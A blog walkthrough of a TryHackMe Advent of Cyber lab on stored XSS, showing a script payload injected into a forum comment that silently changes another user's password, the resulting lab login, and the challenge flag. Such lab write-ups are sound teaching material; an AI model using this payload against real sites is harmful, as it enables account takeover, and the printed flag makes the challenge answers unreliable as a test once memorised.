---
title:  "TryHackMe: Advent of Cyber - Day 5 - Pesky Elf Forum"
date:   2021-12-12 17:00:00 +1000
excerpt: Learning about XSS. 
---

This is a write up for the Day 5 - Pesky Elf Forum challenge in the [**Advent of Cyber**](https://tryhackme.com/room/adventofcyber3) room on [TryHackMe](https://tryhackme.com). Some tasks may have been omitted as they do not require an answer.

***

### What flag did you get when you disabled the plugin?

After loggin in a McSkidy, we add a comment to check if a Stored XSS vulnerability is present.

Add an underline to the text and as it is rendered, Stored XSS is present.

```
<u>test</u>
```

<img src="{{ site.baseurl }}/assets/images/2021-12-12-advent-of-cyber-day-5/d5_1.jpg">

As we are trying to change the Grinch's password, we can add a comment with the follow code.

```
<script>fetch('/settings?new_password=pass123');</script>
```

<img src="{{ site.baseurl }}/assets/images/2021-12-12-advent-of-cyber-day-5/d5_2.jpg">

We can now attempt to log in as the Grinch.

```
grinch:pass123
```

Disabling the 'Christmas to Buttmas' plugin reveals the following flag.

<img src="{{ site.baseurl }}/assets/images/2021-12-12-advent-of-cyber-day-5/d5_3.jpg">

> Answer: **THM{NO_MORE_BUTTMAS}**

### Recap

In this task we learnt:
 * What is an XSS vulnerability
 * What Types of XSS vulnerabilities there are
Challenge Walkthrough
 